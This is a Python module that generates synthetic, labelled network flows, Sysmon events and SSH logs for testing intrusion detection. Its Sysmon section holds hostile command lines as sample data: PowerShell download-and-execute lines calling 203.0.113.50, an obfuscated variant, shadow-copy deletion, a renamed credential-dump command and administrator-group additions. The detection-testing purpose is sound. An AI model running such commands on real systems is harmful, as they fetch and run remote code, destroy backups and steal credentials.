"""Synthetic log/flow generator.

IMPORTANT: everything produced here is SYNTHETIC and is used only for demonstrations/tests.
Results on this data must never be presented as real-world experimental findings.
Includes deliberate overlap between benign and malicious behaviour (benign scanners, backups,
automation, admin PowerShell, slow-and-low attacks) so that rule-based and ML detection make
realistic errors rather than scoring a trivial 100%.
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta

import numpy as np
import pandas as pd

import config

FLOW_FEATURES = ["dst_port", "protocol_num", "duration", "fwd_pkts", "bwd_pkts", "fwd_bytes", "bwd_bytes",
                 "bytes_per_s", "pkts_per_s", "syn_count", "rst_count", "ack_count", "avg_pkt_size",
                 "iat_mean", "iat_std", "fwd_pkt_len_mean", "bwd_pkt_len_mean"]

SERVERS = {"10.0.1.10": "web-01", "10.0.1.11": "db-01", "10.0.1.12": "dc-01", "10.0.1.13": "bastion-01"}
BENIGN_PORTS = [(80, .3), (443, .35), (53, .12), (22, .04), (3389, .02), (445, .05), (8080, .04), (123, .04), (25, .02), (3306, .02)]
START = datetime(2026, 11, 20, 0, 0, 0)


def _ln(rng, mu, sigma, n):
    return np.exp(rng.normal(np.log(mu), sigma, n))


def _derive(df: pd.DataFrame, rng) -> pd.DataFrame:
    df["fwd_bytes"] = (df["fwd_pkts"] * df["fwd_pkt_len_mean"]).round()
    df["bwd_bytes"] = (df["bwd_pkts"] * df["bwd_pkt_len_mean"]).round()
    tot_b = df["fwd_bytes"] + df["bwd_bytes"]
    tot_p = (df["fwd_pkts"] + df["bwd_pkts"]).clip(lower=1)
    dur = df["duration"].clip(lower=1e-3)
    df["bytes_per_s"] = tot_b / dur
    df["pkts_per_s"] = tot_p / dur
    df["avg_pkt_size"] = tot_b / tot_p
    df["iat_mean"] = dur / tot_p
    df["iat_std"] = df["iat_mean"] * _ln(rng, 0.8, 0.5, len(df))
    df["ack_count"] = (df["fwd_pkts"] * 0.9).round()
    return df


def _features(kind: str, n: int, rng, port=None) -> pd.DataFrame:
    d: dict = {"protocol_num": np.full(n, 6)}
    if kind == "BENIGN":
        ports = [p for p, _ in BENIGN_PORTS]
        w = np.array([w for _, w in BENIGN_PORTS]); w = w / w.sum()
        d["dst_port"] = rng.choice(ports, n, p=w)
        d["duration"] = _ln(rng, 1.5, 1.2, n)
        d["fwd_pkts"] = np.maximum(1, _ln(rng, 8, .9, n).round())
        d["bwd_pkts"] = np.maximum(0, _ln(rng, 9, .9, n).round())
        d["fwd_pkt_len_mean"] = _ln(rng, 250, .8, n)
        d["bwd_pkt_len_mean"] = _ln(rng, 600, .9, n)
        d["syn_count"] = 1 + rng.poisson(.2, n)
        d["rst_count"] = (rng.random(n) < .05).astype(int)
        d["protocol_num"] = np.where(d["dst_port"] == 53, 17, 6)
    elif kind == "DoS":
        flood = rng.random(n) < .75
        d["dst_port"] = rng.choice([80, 443, 8080], n)
        d["duration"] = np.where(flood, _ln(rng, .4, .5, n), _ln(rng, 6, .6, n))
        d["fwd_pkts"] = np.where(flood, _ln(rng, 600, .5, n), _ln(rng, 45, .6, n)).round().clip(min=1)
        d["bwd_pkts"] = np.where(flood, _ln(rng, 4, .6, n), _ln(rng, 20, .6, n)).round()
        d["fwd_pkt_len_mean"] = np.where(flood, _ln(rng, 62, .15, n), _ln(rng, 200, .5, n))
        d["bwd_pkt_len_mean"] = _ln(rng, 150, .7, n)
        d["syn_count"] = np.where(flood, (d["fwd_pkts"] * .9).round(), 1 + rng.poisson(1, n))
        d["rst_count"] = np.where(flood, rng.poisson(30, n), (rng.random(n) < .1).astype(int))
    elif kind == "PortScan":
        d["dst_port"] = rng.integers(1, 1025, n)
        d["duration"] = _ln(rng, .01, .8, n)
        d["fwd_pkts"] = rng.integers(1, 4, n)
        d["bwd_pkts"] = rng.integers(0, 3, n)
        d["fwd_pkt_len_mean"] = rng.uniform(40, 70, n)
        d["bwd_pkt_len_mean"] = rng.uniform(0, 60, n)
        d["syn_count"] = np.ones(n, dtype=int)
        d["rst_count"] = (rng.random(n) < .7).astype(int)
    elif kind == "BruteForce":
        d["dst_port"] = rng.choice([22, 3389, 21], n, p=[.6, .3, .1])
        d["duration"] = _ln(rng, 1.8, .4, n)
        d["fwd_pkts"] = np.maximum(3, _ln(rng, 18, .3, n).round())
        d["bwd_pkts"] = np.maximum(2, _ln(rng, 16, .3, n).round())
        d["fwd_pkt_len_mean"] = rng.uniform(80, 160, n)
        d["bwd_pkt_len_mean"] = rng.uniform(70, 220, n)
        d["syn_count"] = 1 + rng.poisson(.1, n)
        d["rst_count"] = (rng.random(n) < .15).astype(int)
    elif kind == "Exfiltration":
        big = rng.random(n) < .8
        d["dst_port"] = rng.choice([443, 21, 53, 8443], n, p=[.6, .1, .2, .1])
        d["duration"] = _ln(rng, 120, .7, n)
        d["fwd_pkts"] = np.where(big, _ln(rng, 5000, .6, n), _ln(rng, 900, .4, n)).round()
        d["bwd_pkts"] = _ln(rng, 300, .6, n).round()
        d["fwd_pkt_len_mean"] = rng.uniform(1000, 1400, n)
        d["bwd_pkt_len_mean"] = _ln(rng, 70, .5, n)
        d["syn_count"] = 1 + rng.poisson(.2, n)
        d["rst_count"] = (rng.random(n) < .05).astype(int)
    elif kind == "BENIGN_SCANNER":      # authorised vulnerability scanner (benign, scan-like)
        d["dst_port"] = rng.integers(1, 1025, n)
        d["duration"] = _ln(rng, .02, .6, n)
        d["fwd_pkts"] = rng.integers(1, 4, n); d["bwd_pkts"] = rng.integers(0, 3, n)
        d["fwd_pkt_len_mean"] = rng.uniform(40, 70, n); d["bwd_pkt_len_mean"] = rng.uniform(0, 60, n)
        d["syn_count"] = np.ones(n, dtype=int); d["rst_count"] = (rng.random(n) < .5).astype(int)
    elif kind == "BENIGN_BACKUP":       # nightly backup to cloud (benign, exfil-like)
        d["dst_port"] = np.full(n, 443)
        d["duration"] = _ln(rng, 300, .3, n)
        d["fwd_pkts"] = _ln(rng, 3500, .3, n).round(); d["bwd_pkts"] = _ln(rng, 500, .3, n).round()
        d["fwd_pkt_len_mean"] = rng.uniform(1100, 1400, n); d["bwd_pkt_len_mean"] = rng.uniform(50, 90, n)
        d["syn_count"] = np.ones(n, dtype=int); d["rst_count"] = np.zeros(n, dtype=int)
    elif kind == "BENIGN_AUTOMATION":   # SSH automation (benign, brute-force-like)
        d["dst_port"] = np.full(n, 22)
        d["duration"] = _ln(rng, 2.0, .3, n)
        d["fwd_pkts"] = np.maximum(3, _ln(rng, 20, .3, n).round()); d["bwd_pkts"] = np.maximum(2, _ln(rng, 18, .3, n).round())
        d["fwd_pkt_len_mean"] = rng.uniform(90, 170, n); d["bwd_pkt_len_mean"] = rng.uniform(80, 230, n)
        d["syn_count"] = np.ones(n, dtype=int); d["rst_count"] = np.zeros(n, dtype=int)
    else:
        raise ValueError(kind)
    if port is not None:
        d["dst_port"] = np.full(n, port)
    return _derive(pd.DataFrame(d), rng)


def _ext_ip(rng) -> str:
    return f"{rng.choice([203, 198, 45, 185])}.{rng.integers(0, 255)}.{rng.integers(0, 255)}.{rng.integers(1, 255)}"


def make_flows(n: int = 12000, seed: int = 42) -> pd.DataFrame:
    """Generate labelled network-flow records with burst structure and realistic overlap."""
    rng = np.random.default_rng(seed)
    clients = [f"10.0.0.{i}" for i in range(2, 60)]
    srv_ips = list(SERVERS)
    parts: list[pd.DataFrame] = []

    def add(kind, label, cat, count, src, dst_fn, start, spread_s, slow=False):
        f = _features(kind, count, rng)
        f["src_ip"] = src
        f["dst_ip"] = [dst_fn() for _ in range(count)]
        gap = spread_s / max(count, 1)
        offs = np.cumsum(rng.exponential(gap, count)) if not slow else np.arange(count) * gap
        f["timestamp"] = [start + timedelta(seconds=float(o)) for o in offs]
        f["is_malicious"] = label
        f["attack_category"] = cat
        parts.append(f)

    n_ben = int(n * .78)
    f = _features("BENIGN", n_ben, rng)
    f["src_ip"] = rng.choice(clients, n_ben)
    ext_mask = rng.random(n_ben) < .35
    f["dst_ip"] = [(_ext_ip(rng) if m else rng.choice(srv_ips)) for m in ext_mask]
    f["timestamp"] = [START + timedelta(seconds=float(s)) for s in rng.uniform(0, 86400, n_ben)]
    f["is_malicious"] = 0; f["attack_category"] = "BENIGN"
    parts.append(f)

    def rand_start():
        return START + timedelta(seconds=float(rng.uniform(600, 85000)))

    n_ben_noise = int(n * .02)
    sc_n = 0
    while sc_n < n_ben_noise:           # benign noisy bursts
        t = rng.choice(["BENIGN_SCANNER", "BENIGN_BACKUP", "BENIGN_AUTOMATION"])
        if t == "BENIGN_SCANNER":
            c = int(rng.integers(30, 60)); add(t, 0, "BENIGN", c, "10.0.9.5", lambda: rng.choice(srv_ips), rand_start(), 25)
        elif t == "BENIGN_BACKUP":
            c = int(rng.integers(1, 3)); add(t, 0, "BENIGN", c, rng.choice(srv_ips), lambda: "198.51.100.7", rand_start(), 5)
        else:
            c = int(rng.integers(10, 20)); add(t, 0, "BENIGN", c, "10.0.9.8", lambda: "10.0.1.13", rand_start(), 40)
        sc_n += c

    targets = {"DoS": int(n * .05), "PortScan": int(n * .06), "BruteForce": int(n * .05), "Exfiltration": int(n * .04)}
    for cat, target in targets.items():
        done = 0
        while done < target:
            src = _ext_ip(rng) if rng.random() < .85 else str(rng.choice(clients))
            victim = str(rng.choice(srv_ips))
            slow = rng.random() < .3
            if cat == "DoS":
                c = int(rng.integers(20, 60)); add(cat, 1, cat, c, src, lambda: "10.0.1.10", rand_start(), 30)
            elif cat == "PortScan":
                c = int(rng.integers(40, 120)); spread = 900 if slow else 25
                add(cat, 1, cat, c, src, lambda: victim, rand_start(), spread, slow=slow)
            elif cat == "BruteForce":
                c = int(rng.integers(20, 70)); spread = 600 if slow else 50
                add(cat, 1, cat, c, src, lambda: "10.0.1.13", rand_start(), spread, slow=slow)
            else:
                c = int(rng.integers(1, 4)); src = str(rng.choice(srv_ips + clients))
                add(cat, 1, cat, c, src, lambda: _ext_ip(rng), rand_start(), 60)
            done += c

    df = pd.concat(parts, ignore_index=True)
    df = df.sort_values("timestamp").reset_index(drop=True)
    df["flow_id"] = [f"FLW-{seed}-{i:06d}" for i in range(len(df))]
    df["hostname"] = df["dst_ip"].map(SERVERS).fillna("ext-or-client")
    df["username"] = np.nan
    for c in ("duration", "bytes_per_s", "pkts_per_s", "avg_pkt_size", "iat_mean", "iat_std", "fwd_pkt_len_mean", "bwd_pkt_len_mean"):
        df[c] = df[c].round(5)
    cols = ["flow_id", "timestamp", "src_ip", "dst_ip", "hostname", "username"] + FLOW_FEATURES + ["is_malicious", "attack_category"]
    return df[cols]


# ---------------------------------------------------------------- endpoint ---
HOSTS = ["WS-FIN-01", "WS-HR-02", "WS-DEV-03", "SRV-APP-01", "SRV-DC-01"]
USERS = ["alice", "bob", "carol", "dave", "svc_backup"]


def make_sysmon(n_benign: int = 700, seed: int = 7) -> list[dict]:
    rng = np.random.default_rng(seed)
    ev: list[dict] = []

    def t():
        return (START + timedelta(seconds=float(rng.uniform(0, 86400)))).strftime("%Y-%m-%d %H:%M:%S")

    def rec(eid, host, user, image, cmd="", parent="C:\\Windows\\explorer.exe", target="", dip="", dport=0, cat="BENIGN", ts=None):
        ev.append({"UtcTime": ts or t(), "EventID": eid, "Computer": host, "User": user, "Image": image, "ParentImage": parent,
                   "CommandLine": cmd, "TargetFilename": target, "DestinationIp": dip, "DestinationPort": dport, "_synthetic_category": cat})

    benign_proc = [("C:\\Program Files\\Google\\Chrome\\chrome.exe", "chrome.exe --type=renderer"),
                   ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
                   ("C:\\Program Files\\Microsoft Office\\winword.exe", "winword.exe report.docx"),
                   ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir"), ("C:\\Windows\\System32\\notepad.exe", "notepad.exe notes.txt")]
    for _ in range(n_benign):
        h, u = rng.choice(HOSTS), rng.choice(USERS)
        r = rng.random()
        if r < .55:
            img, cmd = benign_proc[rng.integers(len(benign_proc))]; rec(1, h, u, img, cmd)
        elif r < .75:
            rec(11, h, u, "C:\\Windows\\explorer.exe", target=f"C:\\Users\\{u}\\Documents\\file{rng.integers(1000)}.docx")
        elif r < .9:
            rec(3, h, u, "C:\\Program Files\\Google\\Chrome\\chrome.exe", dip=f"142.250.{rng.integers(255)}.{rng.integers(255)}", dport=443)
        elif r < .96:
            rec(1, h, "svc_backup", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", parent="C:\\Windows\\System32\\taskeng.exe")
        elif r < .98:       # benign hidden-window admin script (rule false positive)
            rec(1, h, "svc_backup", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Scripts\\patch_check.ps1", parent="C:\\Windows\\System32\\taskeng.exe")
        else:               # benign temp installer (rule false positive)
            rec(11, h, u, "C:\\Windows\\System32\\msiexec.exe", target=f"C:\\Users\\{u}\\AppData\\Local\\Temp\\setup{rng.integers(99)}.exe")

    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    for _ in range(25):
        h, u = rng.choice(HOSTS), rng.choice(USERS[:4]); r = rng.random()
        if r < .35:
            rec(1, h, u, ps, "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
                parent="C:\\Program Files\\Microsoft Office\\winword.exe", cat="PowerShell Abuse")
        elif r < .65:
            rec(1, h, u, ps, "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')",
                parent="C:\\Windows\\System32\\cmd.exe", cat="PowerShell Abuse")
        else:   # obfuscated variant evades regex rules
            rec(1, h, u, ps, "powershell.exe -c \"$a='Dow'+'nloadStr'+'ing'; & ([scriptblock]::Create((iwr http://203.0.113.51/b)))\"",
                parent="C:\\Windows\\System32\\wscript.exe", cat="PowerShell Abuse")
    for _ in range(20):
        h, u = rng.choice(HOSTS), rng.choice(USERS[:4]); r = rng.random()
        if r < .5:
            rec(1, h, u, "C:\\Windows\\System32\\net.exe", f"net localgroup administrators {u}x /add", parent="C:\\Windows\\System32\\cmd.exe", cat="Privilege Escalation")
        elif r < .8:
            rec(1, h, u, "C:\\Windows\\System32\\whoami.exe", "whoami /priv", parent="C:\\Windows\\System32\\cmd.exe", cat="Privilege Escalation")
        else:   # token abuse via renamed tool (evades rule)
            rec(1, h, u, "C:\\Users\\Public\\upd.exe", "upd.exe sekur lsa::logonpasswords", parent="C:\\Windows\\System32\\cmd.exe", cat="Privilege Escalation")
    for _ in range(22):
        h, u = rng.choice(HOSTS), rng.choice(USERS[:4]); r = rng.random()
        if r < .4:
            rec(11, h, u, "C:\\Users\\Public\\x.exe", target=f"C:\\Users\\{u}\\AppData\\Local\\Temp\\payload{rng.integers(99)}.exe", cat="Suspicious File Activity")
        elif r < .65:
            rec(1, h, u, "C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /all /quiet", parent="C:\\Windows\\System32\\cmd.exe", cat="Suspicious File Activity")
        elif r < .85:
            for k in range(3):
                rec(11, h, u, "C:\\Users\\Public\\enc.exe", target=f"C:\\Users\\{u}\\Documents\\doc{k}.docx.locked", cat="Suspicious File Activity")
        else:   # staged archive in public folder (evades rule)
            rec(11, h, u, "C:\\Windows\\System32\\7z.exe", target="C:\\Users\\Public\\staging\\data.7z", cat="Suspicious File Activity")
    for _ in range(12):
        rec(3, rng.choice(HOSTS), rng.choice(USERS[:4]), "C:\\Users\\Public\\upd.exe", dip=f"185.{rng.integers(255)}.{rng.integers(255)}.9",
            dport=int(rng.choice([4444, 4444, 1337, 8888])), cat="C2 Connection")
    ev.sort(key=lambda e: e["UtcTime"])
    return ev


def make_auth_log(seed: int = 11) -> tuple[list[str], list[str]]:
    """Return (log lines, ground-truth categories per line) in OpenSSH/auth.log syslog format."""
    rng = np.random.default_rng(seed)
    entries: list[tuple[datetime, str, str]] = []
    for _ in range(300):
        ts = START + timedelta(seconds=float(rng.uniform(0, 86400))); u = rng.choice(["alice", "bob", "dave"])
        ip = f"10.0.0.{rng.integers(2, 60)}"
        if rng.random() < .93:
            entries.append((ts, f"bastion-01 sshd[{rng.integers(1000, 9999)}]: Accepted password for {u} from {ip} port {rng.integers(30000, 60000)} ssh2", "BENIGN"))
        else:
            entries.append((ts, f"bastion-01 sshd[{rng.integers(1000, 9999)}]: Failed password for {u} from {ip} port {rng.integers(30000, 60000)} ssh2", "BENIGN"))
    for b in range(10):
        ip = _ext_ip(rng); t0 = START + timedelta(seconds=float(rng.uniform(1000, 80000))); slow = b % 4 == 3
        for k in range(int(rng.integers(15, 30))):
            u = rng.choice(["root", "admin", "test", "oracle", "alice"])
            ts = t0 + timedelta(seconds=k * (45 if slow else 3))
            valid = "" if u in ("root", "alice") else "invalid user "
            entries.append((ts, f"bastion-01 sshd[{rng.integers(1000, 9999)}]: Failed password for {valid}{u} from {ip} port {rng.integers(30000, 60000)} ssh2", "BruteForce"))
    entries.sort(key=lambda e: e[0])
    lines = [f"{e[0].strftime('%b %d %H:%M:%S')} {e[1]}" for e in entries]
    return lines, [e[2] for e in entries]


def write_zeek_conn(flows: pd.DataFrame, path) -> None:
    hdr = ["#separator \\x09", "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tduration\torig_bytes\tresp_bytes\tconn_state\torig_pkts\tresp_pkts"]
    lines = list(hdr)
    for r in flows.itertuples():
        ts = pd.Timestamp(r.timestamp).timestamp()
        lines.append("\t".join(map(str, [f"{ts:.6f}", r.flow_id, r.src_ip, 40000, r.dst_ip, int(r.dst_port), "tcp", f"{r.duration:.6f}",
                                         int(r.fwd_bytes), int(r.bwd_bytes), "RSTO" if r.rst_count else "SF", int(r.fwd_pkts), int(r.bwd_pkts)])))
    path.write_text("\n".join(lines), encoding="utf-8")


def generate_all(n_train: int = 12000, n_live: int = 4000) -> dict:
    out = config.SYNTH_DIR
    train = make_flows(n_train, seed=42)
    live = make_flows(n_live, seed=2024)          # different seed => unseen workload for SOC experiments
    train.to_csv(out / "train_flows.csv", index=False)
    live.to_csv(out / "live_flows.csv", index=False)
    sysmon = make_sysmon()
    (out / "sysmon_events.jsonl").write_text("\n".join(json.dumps(e) for e in sysmon), encoding="utf-8")
    lines, truth = make_auth_log()
    (out / "auth.log").write_text("\n".join(lines), encoding="utf-8")
    pd.DataFrame({"line_no": range(len(truth)), "category": truth}).to_csv(out / "auth_log_truth.csv", index=False)
    write_zeek_conn(live.head(300), out / "zeek_conn.log")
    (out / "README_SYNTHETIC.txt").write_text("All files here are SYNTHETIC demo data generated by ingestion/synthetic.py.\n", encoding="utf-8")
    return {"train_flows": len(train), "live_flows": len(live), "sysmon_events": len(sysmon), "auth_lines": len(lines)}
